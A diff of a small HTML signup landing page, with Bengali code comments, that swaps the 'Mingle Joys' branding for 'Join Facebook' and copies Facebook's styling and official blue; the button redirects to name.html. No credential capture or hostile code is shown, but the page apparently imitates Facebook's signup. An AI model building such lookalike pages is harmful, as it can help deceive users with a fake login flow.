@@ -3,102 +3,113 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Join Mingle Joys</title>
+<title>Join Facebook</title>
 
 <style>
-  /* বেসিক সেটআপ */
+  /* ১. পুরো ব্যাকগ্রাউন্ড একদম পিওর সাদা নিশ্চিত করা */
   body {
     margin: 0;
     padding: 0;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background-color: #ffffff;
+    background-color: #ffffff !important;
+    color: #1c1e21;
     display: flex;
     justify-content: center;
     min-height: 100vh;
-    color: #000000;
-    overflow-x: hidden;
   }
 
   .container {
-    max-width: 400px;
-    width: 90%;
-    padding: 20px;
+    max-width: 450px;
+    width: 100%;
+    padding: 16px;
     display: flex;
     flex-direction: column;
-    position: relative;
+    background-color: #ffffff;
   }
 
-  /* উপরে বাম কোণায় ব্যাক বাটন */
+  /* ব্যাক বাটন স্টাইল */
   .header {
-    width: 100%;
-    display: flex;
-    align-items: center;
+    margin-top: 10px;
     margin-bottom: 20px;
   }
 
   .back-btn {
-    font-size: 28px;
-    text-decoration: none;
-    color: #000;
-    cursor: pointer;
+    font-size: 24px;
     background: none;
     border: none;
+    cursor: pointer;
+    color: #000;
     padding: 0;
-    line-height: 1;
   }
 
+  /* শিরোনাম */
   h1 {
-    font-size: 30px;
+    font-size: 24px;
     font-weight: 700;
-    margin: 10px 0 25px 0;
+    margin: 0 0 20px 0;
+    color: #000;
   }
 
+  /* ছবির কন্টেইনার - ছবির বর্ডার গোল করা হয়েছে */
   .image-container {
     width: 100%;
-    margin-bottom: 30px;
+    margin-bottom: 25px;
     text-align: center;
-    background: #fff;
   }
 
   .image-container img {
     width: 100%;
-    max-width: 320px;
-    height: auto;
+    border-radius: 12px; /* ছবির কোনাগুলো গোল করার জন্য */
+    display: block;
   }
 
+  /* ডেসক্রিপশন টেক্সট */
   .description {
     font-size: 16px;
-    line-height: 1.5;
-    color: #555;
-    margin-bottom: 40px;
+    line-height: 1.4;
+    color: #4b4f56;
+    margin-bottom: 35px;
+    padding-right: 10px;
   }
 
-  /* বাটন এবং লোডার স্টাইল */
+  /* নীল বাটন (Create Account) */
   .btn-main {
     width: 100%;
-    padding: 16px;
-    background-color: #1877f2;
+    padding: 14px 0;
+    background-color: #0064e0; /* ফেসবুকের অফিসিয়াল ব্লু */
     color: #ffffff;
     border: none;
-    border-radius: 30px;
+    border-radius: 25px;
     font-size: 16px;
-    font-weight: 600;
+    font-weight: 500;
     cursor: pointer;
+    margin-bottom: 12px;
     display: flex;
     justify-content: center;
     align-items: center;
-    position: relative;
-    transition: background 0.3s;
   }
 
-  /* ছোট সার্কেল বা স্পিনার */
+  /* সাদা বাটন (Find Account) */
+  .btn-outline {
+    width: 100%;
+    padding: 14px 0;
+    background-color: #ffffff;
+    color: #1c1e21;
+    border: 1px solid #bec3c9;
+    border-radius: 25px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+  }
+
+  /* লোডার স্টাইল */
   .loader {
-    width: 20px;
-    height: 20px;
-    border: 3px solid #ffffff;
+    width: 18px;
+    height: 18px;
+    border: 2px solid #ffffff;
     border-bottom-color: transparent;
     border-radius: 50%;
-    display: none; /* শুরুতে লুকানো থাকবে */
+    display: none;
     animation: rotation 0.8s linear infinite;
     margin-left: 10px;
   }
@@ -106,19 +117,6 @@
   @keyframes rotation {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
-  }
-
-  .btn-outline {
-    width: 100%;
-    padding: 16px;
-    background-color: transparent;
-    color: #1877f2;
-    border: 1.5px solid #1877f2;
-    border-radius: 30px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 12px;
   }
 
 </style>
@@ -130,14 +128,14 @@
     <button class="back-btn" onclick="goBack()">←</button>
   </div>
 
-  <h1>Join Mingle Joys</h1>
+  <h1>Join Facebook</h1>
 
   <div class="image-container">
-     <img src="file_00000000f20c7208afe5e3732499da18.png" alt="Mingle Joys">
+     <img src="file_00000000f20c7208afe5e3732499da18.png" alt="Banner Image">
   </div>
 
   <div class="description">
-    Create an account to connect with friends, family and communities who share your interests.
+    Create an account to connect with friends, family and communities of people who share your interests.
   </div>
 
   <button class="btn-main" id="createBtn" onclick="startLoading()">
@@ -149,25 +147,21 @@
 </div>
 
 <script>
-  // লোডিং অ্যানিমেশন এবং পেজ পরিবর্তন
   function startLoading() {
     const btnText = document.getElementById('btnText');
     const loader = document.getElementById('loader');
     const createBtn = document.getElementById('createBtn');
 
-    // বাটন টেক্সট পরিবর্তন ও লোডার দেখানো
-    btnText.innerText = "Connecting...";
+    btnText.innerText = "Processing...";
     loader.style.display = "inline-block";
-    createBtn.style.pointerEvents = "none"; // ডাবল ক্লিক রোধ করতে
     createBtn.style.opacity = "0.8";
+    createBtn.style.pointerEvents = "none";
 
-    // ২ সেকেন্ড পর অন্য পেজে যাবে
     setTimeout(() => {
-      window.location.href = "signup.html";
+      window.location.href = "name.html";
     }, 2000);
   }
 
-  // আগের পেজে ফিরে যাওয়ার ফাংশন
   function goBack() {
     window.history.back();
   }
